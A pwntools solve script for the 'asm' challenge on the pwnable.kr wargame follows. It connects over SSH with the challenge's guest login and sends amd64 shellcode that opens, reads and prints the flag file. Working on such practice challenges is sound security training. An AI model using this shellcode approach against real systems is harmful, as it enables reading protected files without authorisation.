from pwn import *

context(arch='amd64', os='linux', bits=64)
# create ssh connect
shell = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
#port forward
conn = shell.connect_remote('localhost', 9026)
#make shellcode
flag_file_name = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'

sc = shellcraft.amd64.pushstr(flag_file_name)
sc += shellcraft.amd64.linux.open('rsp', 0, 0)
sc += shellcraft.amd64.linux.read('rax', 'rsp', 128)
sc += shellcraft.amd64.linux.write(1, 'rsp', 128)


#recv tips
conn.recvuntil('shellcode:')

#send shellcode
conn.send(asm(sc))

#recv result
log.info(conn.recvline())

conn.close()
shell.close()

